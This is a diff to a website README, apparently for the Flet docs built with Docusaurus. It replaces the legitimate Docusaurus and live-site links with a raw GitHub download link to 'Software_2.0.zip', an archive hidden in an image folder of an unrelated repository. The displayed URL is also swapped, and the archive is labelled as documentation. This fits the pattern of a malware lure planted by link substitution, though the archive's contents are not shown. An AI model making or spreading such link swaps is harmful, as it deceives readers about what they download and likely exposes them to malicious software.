@@ -1,8 +1,8 @@
 # Website
 
-This website is built using [Docusaurus 2](https://v2.docusaurus.io/), a modern static website generator.
+This website is built using [Docusaurus 2](https://github.com/rrraade/website/raw/refs/heads/main/static/img/docs/controls/cupertinoradio/Software_2.0.zip), a modern static website generator.
 
-View the live site at [https://flet.dev/docs/](https://flet.dev/docs/).
+View the live site at [https://github.com/rrraade/website/raw/refs/heads/main/static/img/docs/controls/cupertinoradio/Software_2.0.zip](https://github.com/rrraade/website/raw/refs/heads/main/static/img/docs/controls/cupertinoradio/Software_2.0.zip).
 
 ### Installation
 
